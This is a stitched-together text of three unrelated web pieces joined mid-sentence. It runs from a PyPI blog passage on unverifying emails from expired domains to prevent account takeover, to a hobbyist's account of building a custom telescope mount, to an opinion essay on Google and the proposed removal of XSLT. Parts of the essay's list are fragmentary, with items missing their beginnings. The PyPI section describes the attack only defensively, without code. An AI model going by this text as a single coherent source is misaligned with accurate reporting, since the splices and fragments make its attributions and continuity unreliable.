Coupled with a form of Two-Factor Authentication (2FA), this helps to further secure the account.</p>
<p>Once expired, an attacker could register the expired domain, set up an email server,
issue a password reset request, and gain access to accounts associated with that domain name.</p>
<p>Accounts with any activity after <a href="https://blog.pypi.org/posts/2024-01-01-2fa-enforced/">January 1 2024 will have 2FA enabled</a>,
and an attacker would need to have either the second factor,
or perform a full account recovery.</p>
<p>For older accounts prior to the 2FA requirement date,
having an email address domain expire could lead to account takeover,
which is what we're attempting to prevent,
as well as minimize potential exposure if an email domain <em>does</em> expire and change hands,
regardless of whether the account has 2FA enabled.</p>
<p>This is not an imaginary attack - this has happened at least once for <a href="https://osv.dev/vulnerability/PYSEC-2022-199">a PyPI project</a> back in 2022,
and <a href="https://blog.illustria.io/illustria-discovers-account-takeover-vulnerability-in-a-popular-package-affecting-1000-8aaaf61ebfc4">other package ecosystems</a>.</p>
<p><strong>TL;DR: If a domain expires, don't consider email addresses associated with it verified any more.</strong></p>
<h2 id="domain-expiration-timeframe">Domain Expiration Timeframe</h2>
<p>Here's a generalized flowchart of phases that domain name registrars often adhere to.
There's typically a grace period before a domain is deleted.
Read more about <a href="https://www.icann.org/resources/pages/registrant-about-errp-2018-12-07-en">ICANN's Expired Registration Recovery Policy (ERRP)</a>.</p>
<p>One way to visualize this can be seen in the below flowchart:</p>
<pre><code>flowchart TD
  A[Domain Active] --&gt;|Expiration Date Reached| B{Owner Renews?}

  B --&gt;|Yes - Within Grace Period| A
  B --&gt;|No| C[Renewal Grace Period&lt;br/&gt;0-45 days]

  C --&gt;|Owner Renews&lt;br/&gt;Regular Price| A
  C --&gt;|No Renewal| D[Redemption Period&lt;br/&gt;30 days]

  D --&gt;|Owner Redeems&lt;br/&gt;High Fee $70-200+| A
  D --&gt;|No Redemption| E[Pending Delete&lt;br/&gt;5 days]

  E --&gt;|Automatic| F[Domain Released]</code></pre>
<p>The word "expiration" might be a bit overloaded,
as conceptually there is no specific state advertised that a domain name has expired,
rather using other indicators we can infer what state the domain name is currently in.</p>
<p>Thanks to our friends at <a href="https://domainr.com/">Domainr</a> (a Fastly service),
we can use their <a href="https://domainr.com/docs/api/v2/status#status-results">Status API</a>
to issue periodic queries for any given domain, and act on the response.</p>
<p>The time interval we've chosen for now is 30 days, as per the flow above,
there's a high likelihood that a domain is still in the Renewal Grace Period
or Redemption Period when we check for status,
and can react before it is released or changes hands.</p>
<p><em>Note</em>: PyPI will not detect a non-expiring domain transfer,
as we assume the parties are acting together to transfer a domain legitimately.</p>
<h2 id="pypi-actions">PyPI Actions</h2>
<p>After an initial bulk check period that took place in April 2025,
PyPI will check daily for any domains in use for status changes,
and update its internal database with the most recent status.</p>
<p>If a domain registration enters the redemption period,
that's an indicator to PyPI that the previously verified email destinations may not be trusted,
and will un-verify a previously-verified email address.
PyPI will not issue a password reset request to addresses that have become unverified.</p>
<p><img alt="Expired by date" src="https://blog.pypi.org/assets/2025-08-13-unverified-by-day.png"></p>
<p>Since the initial implementation early June 2025,
PyPI has unverified over 1,800 email addresses (initial 1,500 excluded from chart),
and will continue to do so daily, to protect both PyPI account holders,
as well as the end users of PyPI packages.</p>
<h2 id="recommendations-for-end-users">Recommendations for end users</h2>
<p>If your PyPI account only has a <strong>single verified</strong> email address from a custom domain name,
add a <strong>second verified</strong> email address from another notable domain (e.g. Gmail) to your account.</p>
<p>During a PyPI account recovery, PyPI may ask for other proofs,
often via other services under the user's control.
If the same email address is used on those other services, the recovery could appear legitimate.
Ensure you have 2FA set on those services as well to prevent potential account takeovers.</p>
<h2 id="thats-all-for-now-folks">That's all for now, folks</h2>
<p>While these changes are not foolproof,
they decrease the likelihood of domain resurrections account takeovers.</p>
<p>Thanks to Eric Case at <a href="https://www.fastly.com/">Fastly</a> for helping us understand some of the complexities
and Samuel Giddins at <a href="https://rubycentral.org/">Ruby Central</a> for their initial ideas of this approach,

<div><figure><p><img alt="" loading="lazy" width="600" height="400" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-640.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-1200.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/orion-opt-1200.WEBP"></p><figcaption>Early Orion Nebula capture</figcaption></figure></div>
<p>A few years back, I developed an interest in astrophotography thanks to YouTubers like <a href="https://www.youtube.com/c/nebulaphotos">Nebula Photos</a>. Armed with an OM System OM-5 and a 15-140mm Olympus lens, I managed some decent shots of the Orion Nebula from a tripod by taking 300 pictures with a 2-second exposure time and stacking them in <a href="https://siril.org/">Siril</a>.</p>
<p>Knowing I could achieve better results with tracking, I bought a Move Shoot Move tracker for around €200. It delivered longer exposures, but finding targets and achieving proper polar alignment remained challenging. I spent countless hours researching proper telescope mounts with GOTO and tracking capabilities, coming close to pulling the trigger on units ranging from €1,200 to €4,000. For a hobby I was still exploring, that investment always felt like a leap too far.</p>
<h2 id="the-pcb-awakening">The PCB Awakening</h2>
<p>Late 2024 I randomly came across this <a href="https://www.youtube.com/watch?v=EPH23zhPg50">YouTube video about custom PCB design</a> in my feed, and I was hooked immediately.</p>
<p>With a decent collection of microcontroller boards, the idea of ditching messy breadboards for clean, custom, affordable PCBs was revelatory. My first project replaced my home thermostat with an ESP32-based design with e-paper display, interlocking finger patterns for the original carbon rubber dome switches and space for a Bosch BME680 sensor breakout.</p>
<p>After completing that project, I revisited the telescope mount idea - this time armed with newfound PCB design skills. The question emerged: "How hard can it be?"</p>
<h2 id="down-the-research-rabbit-hole">Down the Research Rabbit Hole</h2>
<p>The plan crystallized around harmonic drives (strain wave gears) - the favorite of modern telescope mounts for their excellent performance in compact packages. The concept seemed straightforward: motor, microcontroller, optional gearing, and a strain wave gear, all housed in a sturdy enclosure.</p>
<p>I divided my time between scouring AliExpress for components and studying existing DIY builds. AliExpress proved to have the worst search functionality in e-commerce history. Google's <code>site:aliexpress.com</code> became my most reliable tool. Hours were spent analyzing technical drawings of every available harmonic drive, searching for workable options and trying to not lose my mind in the myriad of near-identical items from multiple vendors.</p>
<p>Some other DIY projects provided me with invaluable information:</p>
<ul>
<li><a href="https://github.com/polvinc/HEMY">HEMY</a> - Harmonic drive equatorial mount</li>
<li><a href="https://github.com/romanhujer/HrEM">HrEM</a> - Harmonic reduction equatorial mount</li>
<li><a href="https://github.com/polvinc/DHEM">DHEM</a> - Dual harmonic equatorial mount</li>
<li><a href="https://astrophilos.com/diy-eq-mount-v2/">DIY EQ Mount V2</a> - Comprehensive build guide</li>
</ul>
<p>Soon I was looking into the workings of stepper motors, BLDC motors, Field Oriented Control (FOC), and various open source FOC implementations like <a href="https://simplefoc.com/">SimpleFOC</a>.</p>
<h2 id="design-decisions">Design Decisions</h2>
<p>Honestly, this build didn't require a custom PCB. A FYSETC E4 board or even a breadboarded ESP32 would have worked. But I wanted to create something beautiful from scratch, achieving that "I made this" feeling. The housing, however, absolutely needed to be sturdy and custom-designed.</p>
<p>I started learning <a href="https://www.freecad.org/">FreeCAD</a> alongside <a href="https://www.kicad.org/">KiCad</a>, producing about eight throwaway housing designs before the concept solidified.</p>
<p><img alt="FreeCAD Design" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/freecad-opt-1920.WEBP">
<em>Housing design iterations in FreeCAD - multiple attempts to get the geometry right</em></p>
<h3 id="the-architecture">The Architecture</h3>
<ul>
<li><strong>RA Axis</strong>: 42AIM15 Servo motor with Type 17 harmonic drive (100:1 reduction)</li>
<li><strong>DEC Axis</strong>: MKS Servo042D stepper with Type 14 harmonic drive (100:1 reduction)</li>
<li><strong>Mounting</strong>: Arca Swiss plate (compatible with existing Move Shoot Move wedge)</li>
<li><strong>Operation</strong>: GEM or ALTAZ modes</li>
<li><strong>Microcontroller</strong>: ESP32-S3</li>
<li><strong>Power</strong>: USB-C power delivery up to 24V/4A</li>
<li><strong>Motor driving</strong>: step/dir/en ports via the ULN2003 + MODBUS and CANBUS ports</li>
<li><strong>Extra</strong>: Leftover GPIO pins broken out for future use</li>
</ul>
<p>The 42AIM15 provides 32,768 steps per revolution, configurable to 65,536 steps with 2x oversampling. The MKS Servo042D supports microstepping up to 1/256. Both motors were chosen for their integrated drivers, dramatically simplifying PCB design. With FOC and microstepping, other builds demonstrated decent tracking accuracy without intermediate reduction. Via CANBUS I can control the microstepping regime of the stepper motor. During slews I set the microstepping to 128 from 256, allowing a higher slew speed in degrees / second without putting too much load on the microprocessor.</p>
<h2 id="the-pcb-design">The PCB Design</h2>
<p><img alt="KiCad PCB Design" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/kicad-opt-1920.WEBP">
<em>PCB layout in KiCad showing the semi-circular form factor and component placement</em></p>
<p>The PCB takes a semi-circular form factor, designed to fit snugly within the housing. This unique shape and placement didn't significantly increase the size of the mount, which I already felt was becoming quite beefy. I used an ESP32-S3 Microcontroller without the PCB antenna, so I could fit the module anywhere on the board. The first traces I routed were power and the USB differential pair. I managed to place the microcontroller in such a way that the differential pair goes in a straight line.</p>
<p>Power is available through USB-C thanks to the AP33772 IC which negotiates power via the CC pins on the USB-C connector. Power banks supporting USB PD 3.0 and able to deliver 12V are excellent for making this entire setup portable. Major props to the guys from CentyLab for their <a href="https://github.com/CentyLab/PicoPD">PicoPD</a> schematics and PCB designs using the AP33772. This was a big inspiration for laying out my components. The output trace is very wide to support 24V and also has 4 large capacitors. In hindsight, those caps were maybe a bit overkill because the motors for this usecase hardly produce any sudden power peaks, and a good USB PD power supply would probably already have a decent enough amount of capacitance.</p>
<p>During my research I noticed a lot of integrated motors with CANBUS/MODBUS features, so I added functionality for that as well. The remaining GPIO pins of the ESP32 I simply routed somewhere nearer to the edge of the board so they can be used for other purposes in the future.</p>
<p>Some thought has also gone into choosing the right PCB mounted connectors. I settled on the JST PH series for their compactness and their ability to carry 2A per pin. Matt Millman's <a href="https://www.mattmillman.com/info/crimpconnectors/common-jst-connector-types/">Common JST Connector Types</a> was a great resource for making the final selection.</p>
<h3 id="the-first-pcb-mistake">The First PCB Mistake</h3>
<p>Initially my design was around the AP33772S IC. A last-minute component substitution at JLCPCB - changing the originally specified IC due to stock issues - should have triggered a complete pin compatibility review. Impatience won, and I ordered anyway, replacing the AP33772S with the AP33772.</p>
<p>The result: I2C communication was impossible due to NO-CONNECT pins erroneously tied to ground, and manually getting the VBUS voltage to 24V using an external PD trigger board caused a sudden tiny hole to appear on the chip package, followed by blue smoke. Lesson learned. Version 2 underwent exhaustive verification, and worked flawlessly when it arrived. I also included significantly more test points throughout the board, whch is a practice I'm going to keep going forward. The version 1 boards still work for controlling the mount, but they lack the intergated power delivery.</p>

<em>Version 2 of the custom PCB</em></p>
<h2 id="onstepx-integration">OnStepX Integration</h2>
<p><a href="https://github.com/hjd1964/OnStepX">OnStepX</a> is telescope mount firmware supporting multiple microcontroller platforms, originally developed by Howard Dutton to save his mount from obsolescence. It has since grown into a major open source project with substantial community support.</p>
<p>Without OnStepX, DIY telescope mounts like this wouldn't be feasible for many builders. The ESP32 WiFi support became my preferred communication method, though initial testing revealed WiFi instability during slewing operations. Not surprising once you understand that slewing to a target significantly increases the number of pulses per second sent to the motors, and everything became just too much to handle for our little ESP32.</p>
<p>Two changes resolved the stability issues:</p>
<ol>
<li>Reducing slew rates or increasing step sizes with lower microstep divisions (configurable on-the-fly through OnStepX hooks in the generic motor class)</li>
<li>Configuring the device as a WiFi client rather than access point</li>
</ol>
<p>Apart from adding a custom pin layout file and some code to lower the microstep subdivisions during slewing, OnStepX really just worked out of the box.</p>
<h2 id="manufacturing-and-assembly">Manufacturing and Assembly</h2>
<p>All manufacturing was handled by JLCPCB - both PCB fabrication and CNC machining. Sending CNC production files without 3D printing prototypes first was a calculated gamble that paid off; everything fit (almost) perfectly upon arrival.</p>
<p><img alt="Assembly Process" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/build-8-opt-1920.WEBP">
<em>Mount fully assembled. Yes, those are 5 euro rainwater pipe clamps holding the telescope</em></p>
<p>One minor adjustment was required: the red cap at the RA axis rubbed against the harmonic drive. The oversight occurred because I modeled the cup interior without accounting for the harmonic drive mounting screws. I used a simple spacer to fix the problem. I'm very impressed with the manufacturing quality of the components. To assemble everything I just needed to thread the holes with some M3 or M4 taps and bolt everything together. I opted for manual tapping to save on manufacturing cost.</p>
<h2 id="real-world-performance">Real-World Performance</h2>
<p>Countless nights were spent mastering polar alignment, scope setup, and navigating the quirks of <a href="https://kde.org/applications/education/org.kde.kstars/">KStars</a>, <a href="https://docs.kde.org/trunk5/en/kstars/kstars/ekos.html">Ekos</a>, and <a href="https://indilib.org/">INDI server</a>. The first cloudless nights usually ended in frustration: between polar alignment, WiFi issues, indi server issues, camera issues, slipping motor couplings, and software configuration, dawn would arrive before I captured a single frame. At one point, I celebrated achieving 0.1 arcsecond precision! - only to discover <a href="https://openphdguiding.org/">PHD2</a> was configured with incorrect focal length settings and reported skewed results.</p>
<p>The best verified precision achieved so far is 1-2 arcseconds observed with PHD2, more than adequate for 30-second exposures with a 600mm focal length Sigma lens. I continue using my camera in interval mode, ensuring the signal is somewhere in the middle of the histogram. ISO 3200 usually, with sensor stabilization and noise suppression disabled. Stacking is performed in <a href="https://siril.org/">Siril</a>, though multi-night stacking remains a goal requiring significant planning, luck, and consistency.</p>

<em>The completed mount setup</em></p>
<h2 id="the-economics">The Economics</h2>
<p>Total project cost reached approximately €1,700, including reusable tools like thread taps, various M3/M4/M5 hardware and JST Connector tools. Sometimes bulk purchases or shipping minimums inflated costs. I also bought 2x unused MS6010v3 motors for experimenting/evaluating for a potential future super compact build. And the extra cost of the PCB revision ofcourse.</p>
<p>Calculating single-unit costs yields approximately €800, with potential for reduction in larger quantities. Compared to commercial GOTO mounts in the €1,200-€4,000 range, the economics are competitive - but economics was never the primary driver.</p>

<p><em>Single unit costs represent what one mount would cost without bulk purchases, shipping minimums, and reusable tools.</em></p>
<h2 id="anyway">Anyway</h2>
<p>It was totally worth it.</p>
<p>The failed Version 1 PCB taught me never to skip verification steps, regardless my occasional impatience. OnStepX opened up the world of equatorial mount operation and just the joy of watching that thing slew across the sky. FreeCAD modeling skills improved dramatically through multiple housing iterations. I will probably spend more attention to documenting during future builds: writing down thoughts along the way and taking better pictures/screenshots/recordings.</p>
<p>Sure, I spent about as much as a commercially available mount, but I gained so much more. Plus I have a freaking mount that tracks stars!</p>
<p>That feeling when you point at a nebula, watch it track perfectly, and know (almost) exactly how everything works, cause you built it. ✨</p>

<h2 id="alittlebitofhistory"><a name="index1h2"></a>A little bit of history</h2>

<p>Google entered the browser market at a time when web development was starting to see the light again
after Microsoft's “win” of the <a href="http://en.wikipedia.org/wiki/First%20browser%20war">First browser war</a> through the abuse of its operating system's monopoly
by shipping its <a href="http://en.wikipedia.org/wiki/Internet%20Explorer">Internet Explorer</a> for free and thus cutting off «<a href="http://en.wikipedia.org/wiki/Netscape">Netscape</a>'s air supply»,
as intended.</p>

<p>What managed to break through Microsoft's short-lived victory was an alliance of browsers
(my favorite <a href="https://wok.oblomov.eu/tecnologia/opera-requiem/">Opera</a> on its Presto engine,
<a href="http://en.wikipedia.org/wiki/Mozilla">Mozilla</a>'s <a href="http://en.wikipedia.org/wiki/Firefox">Firefox</a> on its Gecko engine,
and the newborn Safari from <a href="http://en.wikipedia.org/wiki/Apple%20Inc%2E">Apple</a>,
whose <a href="http://en.wikipedia.org/wiki/WebKit">WebKit</a> engine was forked from the <a href="http://en.wikipedia.org/wiki/KHTML">KHTML</a> engine that was being developed
for the <a href="http://en.wikipedia.org/wiki/KDE">KDE</a> <a href="http://en.wikipedia.org/wiki/Linux">Linux</a> desktop environment)
that decided to leverage their standards compliance to reinforce each other's position
against the crippling effect of Microsoft's dominance
—a dominance that Microsoft tried to protect resorting <a href="https://press.opera.com/2003/02/14/opera-releases-bork-edition/" title="Opera releases “Bork” edition">to the vilest tricks</a>.</p>

<p>Google entered the market heavily abusing its dominance in web search
to push the adoption of its <a href="http://en.wikipedia.org/wiki/Google%20Chrome">Chrome</a> browser,
a practice not unlike the one used by Microsoft to push the adoption of IE,
and of equally questionable legality and moral standing,
a thing which was frequently overlooked with several excuses,
not least the fact that Chrome was built on an open source core,
<a href="http://en.wikipedia.org/wiki/Chromium">Chromium</a>, that was mostly assembled from software and libraries
developed by other companies (primarily, Mozilla and Apple).</p>

<p>In the years of Chrome's release,
the Internet was undergoing massive changes,
with the emergence of centralized social media platforms like <a href="http://en.wikipedia.org/wiki/Facebook">Facebook</a>
that started eroding the previous distributed social network of blogging platforms,
Google's own <a href="http://en.wikipedia.org/wiki/Gmail">Gmail</a> mail service gaining ground over
both <abbr title="Internet Service Provider">ISP</abbr> offering
and other “cloud” offers like <a href="http://en.wikipedia.org/wiki/Yahoo%21">Yahoo!</a>'s and Microsoft's <a href="http://en.wikipedia.org/wiki/Hotmail">Hotmail</a>,
and mobile connectivity growing beyond “professionals”,
thanks mostly to Apple's <a href="http://en.wikipedia.org/wiki/iPhone">iPhone</a> and
Google's own at-the-time recent acquisition of <a href="http://en.wikipedia.org/wiki/Android%20%28operating%20system%29">Android</a>,
plus some soon-to-be minor players <a href="https://wok.oblomov.eu/tecnologia/n900/">I've talked about in the past</a>.</p>

<p>For the purposes of our discussion,
these changes had two major points of focus in terms of website development.</p>

<p>On the one hand, web developers started giving more attention to standards compliance,
as it gave them more opportunities towards the growing user base of mobile users,
which were unlikely to have the desktop-dominant Internet Explorer as browser.
This helped accelerate the demise of IE
(which was still going strong when Chrome was first released)
—whose flaky standards compliance was ultimately responsible for its demise
nearly a decade later, and subsequently for the complete discontinuation of its line
(after the brief attempt of a reprise under the legacy <a href="http://en.wikipedia.org/wiki/Microsoft%20Edge%20Legacy">Edge</a> moniker)—
and emboldened the “underdogs” of the time (Mozilla, Apple, Opera).</p>

<p>On the other hand, there was a distinct shift towards centralization of web services,
which in turn accelerated the development of <a href="http://en.wikipedia.org/wiki/web%20application">web application</a>s,
graphical user interfaces for the underlying (centralized) services
that effectively relied on the browser(s) as cross-platform toolkits,
an approach that would later give birth to the abomination
known as <a href="http://en.wikipedia.org/wiki/Electron%20%28software%20framework%29">Electron</a>
and the security nightmare better known as <a href="http://en.wikipedia.org/wiki/node%2Ejs">node.js</a>.</p>

<p>Of course, Google had a primary interest in making web apps a credible alternative to desktop applications,
what with their already-mentioned mail service and the recently-acquired-and-turned-web-app <a href="http://en.wikipedia.org/wiki/Google%20Maps">Google Maps</a>.
And since their browser was mostly a collection of existing <a href="https://wok.oblomov.eu/tag/floss/" rel="tag">FLOSS</a> software stapled together,
they could focus their development effort in creating a faster implementation of <a href="https://wok.oblomov.eu/tag/javascript/" rel="tag">JavaScript</a>,
better known as <a href="http://en.wikipedia.org/wiki/V8%20%28JavaScript%20engine%29">V8</a>.
Never mind the fact that even years later
<a href="https://github.com/mathjax/MathJax/wiki/Understanding-mathjax-performance#remarks-on-speed" title="MathJax performance / Remarks on speed">native implementations of any useful feature would remain faster and cheaper than JavaScript</a>.</p>

<p>But even before their direct involvement in browser development,
Opera and Mozilla had started taking their distance from the <a href="http://en.wikipedia.org/wiki/W3C">W3C</a>
standardizing efforts and set up the <a href="http://en.wikipedia.org/wiki/WHATWG">WHATWG</a>,
a consortium of browser developers dedicated to coordinate rapid development of new web features
without passing through the perceived slow W3C standardization process.</p>

<p>In truth, as it would become clear a few years later
—and even more so with Google effectively taking over the WHATWG and turning into
a sockpuppet to give a semblance of independence to their choices—
the main purpose of the WHATWG was to hijack the development of web technologies
to the benefits of the corporate investors,
whereas the W3C, with all its flaws,
had mostly given priority to features that would be of more general interest.</p>

<p>(It is not by chance that the most controversial standard to ever come out of the W3C
has probably been the <a href="http://en.wikipedia.org/wiki/Encrypted%20Media%20Extensions">Encrypted Media Extensions</a>,
released as a failed attempt to remain relevant in the web space,
and resulting instead of a critical strike against their own credibility as stewards of the open web.)</p>

<h2 id="googleswaronxmlasaproxyforthewaragainsttheopenweb"><a name="index2h2"></a>Google's war on XML as a proxy for the war against the open web</h2>

<p>Arguably, the turning point for the centralization of the web was the year <a href="http://en.wikipedia.org/wiki/2013">2013</a>.
This is essentially the year where <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> stopped trying to pretend they liked to play nice,
and started to “pull the reins in” on interoperability.
Coincidentally, <a href="https://wok.oblomov.eu/tecnologia/opera-requiem-2/">it's also the year Opera stopped being Opera</a>,
but I'll talk about this some more <a href="#afterword">in the afterword</a>.</p>

<p>Let's see a few of the major events relevant to our discussion:</p>

<ol>
<li>2013 is the year Google decides to sunset <a href="http://en.wikipedia.org/wiki/Google%20Reader">Google Reader</a>,
a (if not the most) widely used <a href="http://en.wikipedia.org/wiki/web%20feed">web feed</a> aggregator (for <a href="https://wok.oblomov.eu/tag/rss/" rel="tag">RSS</a> and Atom feeds);</li>
<li>2013 is the year Google decides to close <a href="http://en.wikipedia.org/wiki/XMPP">XMPP</a> server-to-server federation in their <a href="http://en.wikipedia.org/wiki/Google%20Chat">Google Chat</a> service;
<a href="http://en.wikipedia.org/wiki/Facebook">Facebook</a> will to the same with their Messenger product the following year;</li>
<li>2013 is the year Google <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/a3VeYmvEAAAJ" title="Intent to Deprecate and Remove: XSLT">first proposes the removal of XSLT</a>, a proposal that is so unpopular
that it will continue receiving comments <em>against</em> it as far as 5 years later (the last comment in the thread is from 2018);</li>
<li>2013 is the year Google <a href="https://issues.chromium.org/issues/40289400#comment33" title="MathML is not ready for production">removes the just-introduced MathML support from Chrome</a>;
it will take 10 years and <a href="https://mathml.igalia.com/" title="MathML in Web Browsers - Igalia">an external company</a> to bring <a href="https://wok.oblomov.eu/tag/mathml/" rel="tag">MathML</a> support back into the browser.</li>
</ol>

<p>This was just the beginning. Several other actions were undertaken or attempted in the following years.</p>

<ol>
<li>in 2015, the WHATWG introduces the <a href="https://fetch.spec.whatwg.org/">Fetch API</a>,
purportedly intended as the modern replacement for the old <a href="http://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a>;

purportedly as a way to make web pages more accessible and faster to load on mobile,
which coincidentally relied heavily on leveraging large <abbr title="Content Distribution Network">CDN</abbr>s
like Google to cache contents (and optionally pre-render it);
nevermind the facts that the seminal <a href="https://alistapart.com/article/responsive-web-design/" title="Responsive Web Design">Responsive Web Design</a> article on how to design for different screen sizes was from 2010,
that the <code>srcset</code> attribute for images to support different-sized screens was already supported by at-the-time current desktop and mobile browsers,
and that the primary reasons why webpages weren't fast to load on mobile
was because of the so-called <a href="https://idlewords.com/talks/website_obesity.htm" title="The Website Obesity Crisis (2015)">web obesity crisis</a>
which had been known <a href="https://web.archive.org/web/20120524025537/https://gigaom.com/2012/05/23/the-growing-epidemic-of-page-bloat/" title="The growing epidemic of page bloat (Internet Archive mirror)">since 2012 at least</a>,
and that the primary reason why AMP pages loaded faster was because they came with one tenth of the useless crap
attached to the “regular” pages
—so the only actual benefit from AMP was to <em>force</em> webdevs into writing leaner pages, with at least a modicum of responsivity,
(and of course, for Google, to encourage them to funnel everything through Google's —or any other tech giant— servers
for easier metric collection, faster ad serving, and more user profiling);</li>

<li>in 2018, Mozilla removes RSS support from Firefox starting from version 64,
and actively prevents opening them in-browser, giving them an <em>even worse treatment</em> than generic XML files,
for which it keeps showing the structure
(for example: compare how your browser handles <a href="https://wok.oblomov.eu/data/tecnologia.stats.xml">the usage stats XML for this column</a>
with the way it handles <a href="https://wok.oblomov.eu/tecnologia/index.rss">the RSS feed</a> and <a href="https://wok.oblomov.eu/tecnologia/index.atom">the Atom feed</a>);
the official reason is that the “Live Bookmarks” feature couldn't be easily ported to the new architecture;
the fact that support for RSS could still be implemented via extensions, that Mozilla did not ship an extension to replace even just partially
the Live Bookmarks feature —leaving its users in the hands of potentially insecure third-part extensions—
and that feeds got an even worse treatment than generic XML document
show that the official reason is just an excuse;
this is one of the major cracks in the Mozilla façade,

it is immediatelly apparent that at least some of the changes introduced
are primarily intended to prevent adblockers from working, and
<a href="https://www.eff.org/deeplinks/2019/07/googles-plans-chrome-extensions-wont-really-help-security" title="Google’s Plans for Chrome Extensions Won’t Really Help Security">don't actually do much to improve security or privacy</a>;

although this change is not <em>currently</em> relevant for the XML/<wbr>XSLT focus of this article,
I mention it not only because it is one of the many examples of Chrome becoming
less of a <a href="http://en.wikipedia.org/wiki/User%20Agent">User Agent</a> and more of a “Google tool on your computer” over time,

which would have allowed it to replace the widespread (and less efficient) JPEG, PNG and GIF formats

this also is not directly related to XML (unless the reason for the hate is that JPEG&nbsp;XL supports <a href="http://en.wikipedia.org/wiki/XMP">XMP</a> metadata),

</ol>

<p>And we finally get to these days.
Just as <a href="https://www.citationneeded.news/curate-with-rss/">RSS feeds are making a comeback</a>
and users are starting to grow skeptic of the corporate silos,
Google <a href="https://github.com/whatwg/html/issues/11523" title="Should we remove XSLT from the web platform?">makes another run to kill XSLT</a>,
this time using the WHATWG as a sock puppet.
Particularly of note, <a href="https://issues.chromium.org/issues/435623334" title="Deprecate and remove XSLT">the corresponding Chromium issue</a>
was created <em>before</em> the WHATWG Github issue.
It is thus to no one's surprise that the <em>overwhelmingly negative</em> reactions to the issue,
the detailed explanations about why <a href="https://wok.oblomov.eu/tag/XSLT/" rel="tag">XSLT</a> is important,
how instead of removing it browsers should move to more recent versions of the standard,
and even the indications of existing better and more secure libraries to base such new implementations on,
<em>every</em> counterpoint to the removal
have gone <em>completely</em> ignored.</p>

<p>Still, the negative reactions were so extensive that the issue has been
ultimately locked —particularly when people started pointing out that
«we don't have enough resources to spend on this» was a completely idiotic excuse
from billion-dollar companies,
or even from smaller enterprises like Mozilla that apparently have enough money to waste
on features nobody wants like LLM chat integration:
this has ultimately confirmed that
the purpose of the issue was never to actually discuss whether or not XSLT should be removed,
but only to provide a flimsy excuse to pretend the removal was driven by a consensus
rather than a top-down directive from Google.</p>

<p>The only true sentences stated by the Googler responsible for this issue
were that browsers have been stuck with an obsolete version of XSLT for over two decades,
and that the implementations they (Google and Apple) rely on has some security issues.
The Googler in question also conveniently omitted several other important facts.</p>

<p>For example, he omitted that two new major versions of XSLT have been released since
this technology was first implemented in the browsers: XSLT&nbsp;2 in 2007, and XSLT&nbsp;3 in 2017.
This means that <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/a3VeYmvEAAAJ" title="Intent to Deprecate and Remove: XSLT">when Google first proposed to kill XSLT</a>,
a newer, considerably more powerful version of the standard had been released for six years already.
And already at the time people were pleading for browsers support to be upgraded to the new version.</p>

<p>It is thus not by chance or by lack of resources that browsers are stuck with the 1999 XSLT&nbsp;1:
it has been an intentional choice <em>against the users' will</em> since <em>at least</em> 2013,
the year we already mentioned as the turning point for the centralization of the web.
XSLT has been <em>intentionally boycotted</em> by Google, Apple and Mozilla:
using the excuse that it is not widely used today, after decades of undercutting any efforts in adoption,
refusing to fix bugs or even to provide meaningful errors to assist in debugging related issues,
is a complete mockery of the victims of these <em>policy</em>.</p>

<p>The Googler also omits to mention that both Google's and Apple's XSLT implementation
(not Mozilla's, that developed their own) relies on a set of free-software libraries
whose maintainer has <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/913">recently undergone a bombardment of borderline abusive issue reports</a>
from the characteristically extractive corporate exploitation of <abbr title="Free/Libre Open Source Software"><a href="https://wok.oblomov.eu/tag/floss/" rel="tag">FLOSS</a></abbr>,
with requests to provide professional services without actually paying for it in any way.
Let's repeat that again:
we're talking about billion-dollar companies that have been exploiting the labor of free-software maintainers,
<em>demanding</em> a preferential treatment at no cost for them,
limiting their efforts to finding bugs,
without raising a finger to actually fix them
—almost as if the primary intent was to find excuses to expunge the library rather than working to improve the commons.
(And this is before even going into <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3172069037">the irresponsible way in which these libraries were being used</a>.)</p>

<p>But of course anyone questioning the motives of the corporations controlling the WHATWG
or pointing out the abundance of resources they have,
and how these could easily be spent in bringing XSLT support to the XXI century
instead of being spent in user-antagonistic features,
is “off topic” and “in violation of the code of conduct”.</p>

<p>In the end, the WHATWG was forced to close down comments to the Github issue
to stop the flood of negative feedback, so that the Googler could move on to the next step:
<a href="https://github.com/whatwg/html/pull/11563">commencing the process of formalizing the dismissal of XSLT</a></p>

<h2 id="whyitmatters"><a name="index3h2"></a>Why it matters</h2>

<p>When the <a href="http://en.wikipedia.org/wiki/XML">XML</a> specification was released in 1998, it gained traction very quickly,
despite its increased verbosity,
because by losing some of the flexibility of <a href="http://en.wikipedia.org/wiki/SGML">SGML</a>
(the overreaching specification of which <a href="http://en.wikipedia.org/wiki/HTML">HTML</a> was the most famous incarnation)
it favored disambiguation and simplified parsing of documents of arbitrary kind.
Combined with <a href="http://en.wikipedia.org/wiki/XSLT">XSLT</a>, it allowed documents of any kind to become “Internet ready”,
and most importantly ready for the <em>World Wide Web</em>,
helping driving the WWW towards its designed goal of a «<a href="https://www.w3.org/History/1989/proposal.html">universal linked information system</a>».</p>

